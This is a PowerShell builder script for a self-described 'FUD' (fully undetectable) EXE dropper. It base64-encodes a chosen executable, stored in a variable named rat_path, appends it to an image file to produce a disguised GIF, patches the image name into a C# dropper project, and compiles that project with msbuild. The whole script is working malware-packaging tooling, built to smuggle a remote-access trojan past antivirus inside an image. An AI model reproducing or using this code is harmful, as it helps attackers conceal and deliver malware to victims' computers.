function BUILD {
    $Build_Command = "msbuild FUD_EXE_DROPPER_2.sln /t:Build /p:Configuration=Release"
    try {
        Invoke-Expression $Build_Command
    }
    catch {
        Write-Host "Build failed" -ForegroundColor Red
    }
}

function FULL {
    Write-Host "Enter the file path of the EXE you want to embed: " -NoNewline -ForegroundColor Green
    $EXE = Read-Host
    Write-Host "Enter the file path of the IMAGE YOU WANT TO EMBED TO: " -NoNewline -ForegroundColor Green
    $IMAGE = Read-Host
    $IMAGE_NAME = Split-Path $IMAGE -Leaf
    $current_path = Get-Location
    $app_path = $current_path + "\Console_App_Only_Dropper\Program.cs"
    $app_path_contents = Get-Content $app_path
    $app_path_contents.Replace("test_image.jpg", $IMAGE_NAME)
    $rat_path = $EXE
    $image_path = $IMAGE
    $new_line = "`r`n"
    $new_line_bytes = [System.Text.Encoding]::ASCII.GetBytes($new_line)
    $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($rat_path))
    $base64_bytes = [System.Text.Encoding]::ASCII.GetBytes($base64)
    $original_image = [System.IO.File]::ReadAllBytes($image_path)
    $put_together = $original_image + $new_line_bytes + $base64_bytes
    [System.IO.File]::WriteAllBytes("new_file.gif", $put_together)
    BUILD
}

function PROMPT {
    Write-Host "MAYBE FUD EXE DROPPER MADE BY K.DOT#4044" -ForegroundColor Green
    Write-Host "1. Build easy" -ForegroundColor Green
    Write-Host "2. Build FULL CUSTOM" -ForegroundColor Green
    Write-Host "3. Exit" -ForegroundColor Green
    Write-Host "Enter your choice: " -NoNewline -ForegroundColor Green
    $choice = Read-Host
    switch ($choice) {
        1 { BUILD }
        2 { FULL }
        3 { exit }
        default { PROMPT }
    }
}

PROMPT